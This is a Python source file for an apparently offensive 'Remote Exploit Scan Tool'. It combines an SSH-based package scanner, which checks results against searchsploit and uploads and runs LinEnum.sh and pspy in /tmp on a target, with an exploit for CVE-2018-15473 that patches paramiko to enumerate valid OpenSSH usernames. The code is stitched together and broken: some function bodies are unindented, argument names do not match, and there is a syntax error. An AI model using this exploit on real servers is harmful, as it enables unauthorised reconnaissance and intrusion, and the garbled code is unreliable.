#!/usr/bin/env python3

#MIT License
#Copyright (C) 2019 plasticuproject.pm.me
#https://github.com/plasticuproject/rest
#Thanks to mikesz81 for concept and nbulischeck for code review

#Username module:       Dividesbyzer0
#Original CVE:          CVE-2018-15473 (Credit to Justin Gardner)
#Username enumeration:  OpenSSH version < 7.7
#DISCLAIMER:            Use responsibly with permission. Don't be a Skid.

from termcolor import cprint
import subprocess
import paramiko
import argparse
import pathlib
import re
import multiprocessing
import sys
import json
import socket
import logging


badpacks = ('centos','debian','ubuntu','redhat','addon','agent','apps','base','bin','bsd','cache','check','client','command',
            'common','configuration','control','core','cron','data','database','dev','editor','events','extras','family','file',
            'files','form','ftp','generic','gnu','headers','http','info','installation','kernel','legacy','linux','load','manager',
            'message','module','monitor','net','network','one','open','patch','path','plugin','plugins','release','router','secure',
            'security','server','ssl','software','standard','support','system','team','text','the','theme','time','toolkit','tools',
            'unix','update','user','utility','viewer','web','wifi','windows','wireless')

ssh_errors = (paramiko.ssh_exception.AuthenticationException,
              paramiko.ssh_exception.BadAuthenticationType,
              paramiko.ssh_exception.BadHostKeyException,
              paramiko.ssh_exception.ChannelException,
              paramiko.ssh_exception.NoValidConnectionsError,
              paramiko.ssh_exception.PartialAuthentication,
              paramiko.ssh_exception.PasswordRequiredException,
              paramiko.ssh_exception.ProxyCommandFailure,
              paramiko.ssh_exception.SSHException)


# store function we will overwrite to malform the packet
old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# create custom exception for Bad usernames
class BadUsername(Exception):
    def __init__(self):
        pass

# create malicious "add_boolean" function to malform packet
def add_boolean(*args, **kwargs):
    pass

# create function to call when username was invalid
def call_error(*args, **kwargs):
    raise BadUsername()

#create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    #return old add_boolean function so start_client will work again
    paramiko.message.Message.add_boolean = old_add_boolean
    return result


def info():

    #print tool information
    cprint('\nRemote Exploit Scan Tool', 'red', attrs=['bold'])
    cprint('Remotely scan Linux system packages via SSH.\n', attrs=['bold'])
    print('Use SSH credentials to remotely scan linux system')
    print('packages for known exploits in Exploit-DB and run')
    print('basic enumeration scripts.\n')


def get_args():

    # parse arguments
    parser = argparse.ArgumentParser(description=info())
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-u', 'user', '--user', type = str, metavar='username', help='username used to login to host or a single username to enumerate')
    group.add_argument('-U', '--userlist', type = str, help = 'Give a file containing a list of users')
    parser.add_argument('host', type=str, metavar='hostname', help='hostname or IP address of remote machine')
    parser.add_argument('-P', '--port', type=int, metavar='port_number', nargs='?', help='port number (default is 22)', default=22)
    parser.add_argument('-p', '--password', type=str, metavar='password', help='password for user')
    parser.add_argument('-k', type=str, metavar='key_file', help='location of RSA or DSA Key file')
    parser.add_argument('-ss', action='store_true', help='run package list against searchsploit database')
    parser.add_argument('-le', action='store_true', help='run LinEnum.sh and return LE_report')
    parser.add_argument('-t', action='store_true', help='add thorough switch to -le LinEnum.sh')
    parser.add_argument('-ps', action='store_true', help='run pspy64 or pspy32 with defaults and return pspy_out')
    args = parser.parse_args()
    return args


def check_searchsploit():

    # checks if searchsploit is installed
    usr_path = pathlib.Path('/usr/bin/searchsploit')
    if usr_path.is_file() == False:
        cprint('\n[*]Please install searchsploit to continue.[*]\n', 'red')
        quit()


def transfer(ssh, lin_enum, lin_enum_t, pspy):

    # downloads list of installed packages
    sftp = ssh.open_sftp()
    ssh.exec_command('dpkg -l > packages.txt')
    local_path = pathlib.Path.cwd() / 'packages.txt'
    sftp.get('packages.txt', local_path)
    ssh.exec_command('rm packages.txt')
    format_dpkg_file()
    if local_path.stat().st_size == 0:
        ssh.exec_command('rpm -qa > packages.txt')
        sftp.get('packages.txt', local_path)
        ssh.exec_command('rm packages.txt')
        format_rpm_file()
    cprint('[*]Downloading package list...[*]', 'green')
    if lin_enum == True:
        run_lin_enum(ssh, lin_enum_t)
    if pspy == True:
        run_pspy(ssh)
    ssh.close()


def sftp_exists(sftp, path):

    # check if report file is present
    try:
        sftp.stat(path)
        return True
    except FileNotFoundError:
        return False


def run_lin_enum(ssh, lin_enum_t):

    # run LinEnum.sh on remote machine
    cprint('[*]Running LinEnum.sh.[*]', 'green')
    cprint('[*]This may take a few minutes...[*]', 'yellow')
    sftp = ssh.open_sftp()
    script = pathlib.Path.cwd() / 'scripts/LinEnum.sh'
    sftp.put(script, '/tmp/LinEnum.sh')
    transport = ssh.get_transport()
    channel = transport.open_session()
    command = 'chmod +x /tmp/LinEnum.sh && /tmp/./LinEnum.sh -r /tmp/LE_report'
    command_t = command + ' -t'
    if sftp_exists(sftp, '/tmp/LE_report') == True:
        ssh.exec_command('rm /tmp/LE_report')
    if lin_enum_t == False:
        channel.exec_command(command)
    elif lin_enum_t == True:
        channel.exec_command(command_t)
    report = pathlib.Path.cwd() / 'LE_report'
    finished = '### SCAN COMPLETE ###'
    running = True
    while running:
        if sftp_exists(sftp, '/tmp/LE_report') == True:
            ssh.exec_command('cp /tmp/LE_report /tmp/LE_report_test')
            remote_file = sftp.open('/tmp/LE_report_test', 'r')
            for line in remote_file:
                if finished in line:
                    running = False
    cprint('[*]Downloading LinEnum.sh LE_report...[*]', 'green')
    sftp.get('/tmp/LE_report', report)
    ssh.exec_command('rm /tmp/LE_report')
    ssh.exec_command('rm /tmp/LE_report_test')
    ssh.exec_command('rm /tmp/LinEnum.sh')


def run_pspy(ssh):

    # run pspy on remote machine
    stdin, stdout, stderr = ssh.exec_command('uname -p')
    arch_check = stdout.readline()
    if arch_check == 'x86_64\n':
        cprint('[*]Running pspy64 for 2 minutes...[*]', 'green')
        script = pathlib.Path.cwd() / 'scripts/pspy64'
    else:
        cprint('[*]Running pspy32 for 2 minutes...[*]', 'green')
        script = pathlib.Path.cwd() / 'scripts/pspy32'
    sftp = ssh.open_sftp()
    sftp.put(script, '/tmp/pspy')
    command = 'chmod +x /tmp/pspy && timeout 30 /tmp/./pspy'
    stdin, stdout, stderr = ssh.exec_command(command)
    for line in iter(stdout.readline, ''):
        print(line, end='')
        with open('pspy_out', 'a') as outfile:
            outfile.write(line)
    ssh.exec_command('rm /tmp/pspy')
    cprint('[*]Saving pspy_out...[*]', 'green')


def password_connect(hostname, user, secret, port_num, lin_enum, lin_enum_t, pspy):

    # connects to remote machine via ssh with user/pass combo
    cprint('[*]Connecting to {} as {}...[*]'.format(hostname, user), 'green')
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname, username=user, password=secret, port=port_num)
    transfer(ssh, lin_enum, lin_enum_t, pspy)


def get_banner(host, port):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname = host, port = port, username = 'invalidinvalidinvalid', password = 'invalidinvalidinvalid')
    except:
        banner = ssh.get_transport().remote_version
        ssh.close()
    return banner


def nopass_connect(host, port, user):
sock = socket.socket()
try:
    sock.connect((args.hostname, args.port))
    sock.close()
except socket.error:
    print('[-] Connecting to host failed. Please check the specified host and port.')
    sys.exit(1)
if args.user: #single username passed in
	result = checkUsername(args.user)
	if result[1]:
		print(result[0]+" is a valid user!")
	else:
		print(result[0]+" is not a valid user!")
elif args.userList: #username list passed in
	try:
		f = open(args.userList)
	except IOError:
		print("[-] File doesn't exist or is unreadable.")
		sys.exit(3)
	usernames = map(str.strip, f.readlines())
	f.close()
	# map usernames to their respective threads
	pool = multiprocessing.Pool(args.threads)
	results = pool.map(checkUsername, usernames)
	try:
		outputFile = open(args.outputFile, "w")
	except IOError:
		print("[-] Cannot write to outputFile.")
		sys.exit(5)
	if args.outputFormat=='list':
		outputFile.writelines(exportList(results))
		print("[+] Results successfully written to " + args.outputFile + " in List form.")
	elif args.outputFormat=='json':
		outputFile.writelines(exportJSON(results))
		print("[+] Results successfully written to " + args.outputFile + " in JSON form.")
	elif args.outputFormat=='csv':
		outputFile.writelines(exportCSV(results))
		print("[+] Results successfully written to " + args.outputFile + " in CSV form.")
	else:
		print("".join(results))
	outputFile.close()
else: # no usernames passed in
	print("[-] No usernames provided to check")
	sys.exit(4)


def key_file_connect(hostname, user, port_num, secret, key_file, lin_enum, lin_enum_t, pspy):

    # connects to remote machine via ssh with private keyfile and downloads list of instaled packages
    cprint('[*]Connecting to {} as {}...[*]'.format(hostname, user), 'green')
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname, username=user, password=secret, port=port_num, key_filename=key_file)
    transfer(ssh, lin_enum, lin_enum_t, pspy)


def format_dpkg_file():

    # format packages.txt file for use in searchsploit
    packages = []
    first_field = 1
    with open('packages.txt', 'r') as f:
        packs = f.read().split('\n')
    for line in packs:
        if line[:2] == 'ii':
            fields = line.split()
            if len(fields) < 2 + first_field:
                continue
            search = fields[first_field].find(':')
            if search != -1:
                soft_name = clean(fields[first_field][:search])
            else:
                soft_name = clean(fields[first_field])
            search = re.search(r"-|\+|~", fields[first_field + 1])
            if search:
                soft_version = fields[first_field + 1][:search.span()[0]]
            else:
                soft_version = fields[first_field + 1]
            search = soft_version.find(':')
            if search != -1:
                soft_version = soft_version[search + 1:]
            soft_version = clean_version_string(soft_version)
            if not soft_name or not soft_version:
                continue
            if '-' in soft_name:
                for sub_package in soft_name.split('-'):
                    if len(sub_package)>2 and '.' not in sub_package and sub_package not in badpacks:
                        name_version = sub_package +' ' + soft_version
            else:
                if soft_name not in badpacks:
                    name_version = soft_name + ' ' + soft_version
            packages.append(name_version)
    path = pathlib.Path.cwd() / 'packages.txt'
    path.unlink()
    with open('packages.txt', 'a') as f:
        for pack in packages:
            f.write(pack + '\n')


def format_rpm_file():

    #format packages.txt file for use in searchsploit
    packages = []
    with open('packages.txt', 'r') as f:
        packs = f.read().split('\n')
    for line in packs:
        fields = '.'.join(line.split('.')[:-2]).split('-')
        if len(fields) < 2:
            continue
        soft_name = clean('-'.join(fields[:-2]))
        soft_version = clean_version_string(fields[-2])
        if not soft_name or not soft_version:
            continue
        if '-' in soft_name:
            for sub_package in soft_name.split('-'):
                if len(sub_package)> 2 and '.' not in sub_package and sub_package not in badpacks:
                    name_version = sub_package + ' ' + soft_version
        else:
            if soft_name not in badpacks:
                name_version = soft_name + ' ' + soft_version
        packages.append(name_version)
    path = pathlib.Path.cwd() / 'packages.txt'
    path.unlink()
    with open('packages.txt', 'a') as f:
        for pack in packages:
            f.write(pack + '\n')


def clean(soft_name):

    # clean package name from common strings
    for badword in badpacks:
        soft_name = re.sub(r'-' + badword, '', soft_name)
    return soft_name


def clean_version_string(version_string):

    # eliminate invalid characters and last dot from version string
    search = re.search(r'[^0-9.]', version_string)
    if search:
        result = version_string[:search.span()[0]]
    else:
        result = version_string
    if len(result) > 0 and result[-1] == '.':
        result = result[:-1]
    return result


def searchsploit():

    # checks every package in pacakages.txt against searchsploit database, saves them to file and prints to screen
    cprint('[*]Checking packages against Searchsploit Database...[*]', 'green')
    cprint('[*]Please be patient, this may take a few minutes...[*]', 'yellow')
    no_result = 'Exploits: No Result\nShellcodes: No Result\n'
    packs = []
    with open('packages.txt', 'r') as f:
        packages = f.read().split('\n')
    for package in packages:
        res = subprocess.run(['searchsploit', package], capture_output=True)
        output = res.stdout.decode('utf-8')
        if output != no_result:
            print(output)
            packs.append(output)
    cprint('[*]Writing results to exploits.txt...[*]', 'green')
    with open('exploits.txt', 'a') as exploits:
        for pack in packs:
            exploits.write(pack)


def clean_old(lin_enum, pspy, ss):
            
    # removes files from past runs
    path = pathlib.Path.cwd() / 'packages.txt'
    if ss == True:
        if path.is_file():
            path.unlink()
        path = pathlib.Path.cwd() / 'exploits.txt'
        if path.is_file():
            path.unlink()
    path = pathlib.Path.cwd() / 'LE_report'
    if lin_enum == True:
        if path.is_file():
            path.unlink()
    path = pathlib.Path.cwd() / 'pspy_out'
    if pspy == True:
        if path.is_file():
            path.unlink()


def checkUsername(username, tried=0):
# create function to perform authentication with malformed packet and desired username
    sock = socket.socket()
	sock.connect((args.hostname, args.port))
	# instantiate transport
	transport = paramiko.transport.Transport(sock)
	try:
	    transport.start_client()
	except paramiko.ssh_exception.SSHException:
	    # server was likely flooded, retry up to 3 times
	    transport.close()
	    if tried < 4:
	    	tried += 1
	    	return checkUsername(username, tried)
	    else:
	    	print('[-] Failed to negotiate SSH transport')
	try:
		transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
	except BadUsername:
    		return (username, False)
	except paramiko.ssh_exception.AuthenticationException:
    		return (username, True)
	#Successful auth(?)
	raise Exception("There was an error. Is this the correct version of OpenSSH?")


def exportJSON(results):
	data = {"Valid":[], "Invalid":[]}
	for result in results:
		if result[1] and result[0] not in data['Valid']:
			data['Valid'].append(result[0])
		elif not result[1] and result[0] not in data['Invalid']:
			data['Invalid'].append(result[0])
	return json.dumps(data)


def exportCSV(results):
	final = "Username, Valid\n"
	for result in results:
		final += result[0]+", "+str(result[1])+"\n"
	return final


def exportList(results):
	final = ""
	for result in results:
		if result[1]:
			final+=result[0]+" is a valid user!\n"
		else:
			final+=result[0]+" is not a valid user!\n"
	return final

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

# get rid of paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

def enum_user():
sock = socket.socket()
try:
    sock.connect((args.hostname, args.port))
    sock.close()
except socket.error:
    print'[-] Connecting to host failed. Please check the specified host and port.')
    sys.exit(1)

if args.username: #single username passed in
	result = checkUsername(args.username)
	if result[1]:
		print(result[0]+" is a valid user!")
	else:
		print(result[0]+" is not a valid user!")
elif args.userList: #username list passed in
	try:
		f = open(args.userList)
	except IOError:
		print("[-] File doesn't exist or is unreadable.")
		sys.exit(3)
	usernames = map(str.strip, f.readlines())
	f.close()
	# map usernames to their respective threads
	pool = multiprocessing.Pool(args.threads)
	results = pool.map(checkUsername, usernames)
	try:
		outputFile = open(args.outputFile, "w")
	except IOError:
		print("[-] Cannot write to outputFile.")
		sys.exit(5)
	if args.outputFormat=='list':
		outputFile.writelines(exportList(results))
		print("[+] Results successfully written to " + args.outputFile + " in List form.")
	elif args.outputFormat=='json':
		outputFile.writelines(exportJSON(results))
		print("[+] Results successfully written to " + args.outputFile + " in JSON form.")
	elif args.outputFormat=='csv':
		outputFile.writelines(exportCSV(results))
		print("[+] Results successfully written to " + args.outputFile + " in CSV form.")
	else:
		print("".join(results))
	outputFile.close()
else: # no usernames passed in
	print("[-] No usernames provided to check")
	sys.exit(4)


def main():

    # run program
    try:
        args = get_args()
        try:
            if args.k == None:
                clean_old(args.le, args.ps, args.ss)
                if args.p == None:
                    enum_user(args.host, args.P, args.user)
                elif args.p != None:
                    password_connect(args.host, args.user, args.p, args.P, args.le, args.t, args.ps)
            elif args.k != None:
                clean_old(args.le, args.ps)
                key_file_connect(args.host, args.user, args.p, args.P, args.k, args.le, args.t, args.ps)
        except ssh_errors as e:
            print(e)
            cprint('[*]Could not connect to {}.[*]'.format(args.host), 'red')
            quit()
        if args.ss == True:
            check_searchsploit()
            searchsploit()
        cprint('[*]Done[*]', 'green')
    except KeyboardInterrupt:
        print('\n')
        quit()


if __name__ == '__main__':
    main()
